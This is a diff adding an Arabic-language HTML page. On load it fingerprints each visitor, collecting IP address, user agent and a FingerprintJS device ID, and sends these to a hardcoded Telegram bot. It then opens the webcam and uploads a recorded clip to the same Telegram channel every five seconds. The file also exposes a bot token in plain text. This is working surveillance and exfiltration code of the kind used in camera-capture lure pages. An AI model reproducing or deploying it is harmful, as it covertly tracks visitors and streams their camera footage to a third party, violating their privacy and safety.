@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الفيديو وإرسال المعلومات إلى Telegram</title>
+    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ffmpeg.js/0.8.6/ffmpeg.min.js"></script>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            background-color: #f4f4f4;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        video {
+            width: 100%;
+            max-width: 600px;
+            border: 2px solid #007acc;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <h1>تسجيل الفيديو وإرساله مباشرة إلى Telegram!</h1>
+    <video id="videoElement" autoplay muted></video>
+
+    <script>
+        const videoElement = document.getElementById('videoElement');
+        let stream;
+        let recorder;
+        let chunks = [];
+
+        async function startCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                videoElement.srcObject = stream;
+                startRecording();
+            } catch (error) {
+                console.error('خطأ في الوصول إلى الكاميرا:', error);
+                alert('يرجى تمكين إذن الوصول إلى الكاميرا.');
+            }
+        }
+
+        function startRecording() {
+            chunks = [];
+            recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            recorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    chunks.push(event.data);
+                }
+            };
+            recorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                const mp4Blob = await convertWebMToMp4(blob); // تحويل إلى MP4
+                await sendToTelegram(mp4Blob); // إرسال الفيديو إلى Telegram
+                chunks = [];
+            };
+            recorder.start();
+
+            // إرسال الفيديو كل 5 ثوانٍ
+            setInterval(() => {
+                recorder.stop();
+                recorder.start();
+            }, 5000);
+        }
+
+        async function convertWebMToMp4(blob) {
+            const ffmpeg = FFmpeg.createFFmpeg({ log: true });
+            await ffmpeg.load();
+
+            // تحويل blob إلى Uint8Array
+            const arrayBuffer = await blob.arrayBuffer();
+            const inputData = new Uint8Array(arrayBuffer);
+
+            // إضافة الملف إلى ffmpeg
+            ffmpeg.FS('writeFile', 'input.webm', inputData);
+            await ffmpeg.run('-i', 'input.webm', 'output.mp4');
+
+            // قراءة الملف المحول
+            const data = ffmpeg.FS('readFile', 'output.mp4');
+
+            // تحويل إلى Blob
+            return new Blob([data.buffer], { type: 'video/mp4' });
+        }
+
+        async function sendToTelegram(media) {
+            const botToken = '7531625189:AAH8EfmietQxzONKMoclIjJNgxEP89jes3w'; // توكن البوت
+            const chatId = '@Karimbmr'; // اسم القناة
+            const url = `https://api.telegram.org/bot${botToken}/sendVideo`;
+
+            const formData = new FormData();
+            formData.append('video', media, 'video.mp4');
+            formData.append('chat_id', chatId);
+            formData.append('caption', 'فيديو مباشر!'); // إضافة تعليق إذا رغبت
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (!response.ok) {
+                    const errorData = await response.json();
+                    console.error('خطأ في إرسال الفيديو إلى Telegram:', errorData);
+                } else {
+                    console.log('تم إرسال الفيديو كفيديو عادي بنجاح!');
+                }
+            } catch (error) {
+                console.error('خطأ في إرسال الفيديو إلى Telegram:', error);
+            }
+        }
+
+        async function notifyTelegram(ipAddress, userAgent, fingerprint) {
+            const botToken = '7531625189:AAH8EfmietQxzONKMoclIjJNgxEP89jes3w'; // توكن البوت
+            const chatId = '@Karimbmr'; // اسم القناة
+            const message = `شخص ما دخل الموقع!\nعنوان IP: ${ipAddress}\nمعلومات المتصفح: ${userAgent}\nبصمة الجهاز: ${fingerprint}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+
+                if (!response.ok) {
+                    const errorData = await response.json();
+                    console.error('خطأ في إرسال الإشعار إلى Telegram:', errorData);
+                } else {
+                    console.log('تم إرسال الإشعار بنجاح!');
+                }
+            } catch (error) {
+                console.error('خطأ في إرسال الإشعار إلى Telegram:', error);
+            }
+        }
+
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('خطأ في الحصول على عنوان IP:', error);
+                return 'غير متوفر';
+            }
+        }
+
+        async function init() {
+            const ipAddress = await getIPAddress();
+            const userAgent = navigator.userAgent; // الحصول على معلومات المتصفح
+            const fp = await FingerprintJS.load(); // تحميل FingerprintJS
+            const result = await fp.get(); // الحصول على بصمة الجهاز
+            await notifyTelegram(ipAddress, userAgent, result.visitorId);
+            startCamera();
+        }
+
+        // بدء العملية
+        init();
+    </script>
+</body>
+</html>
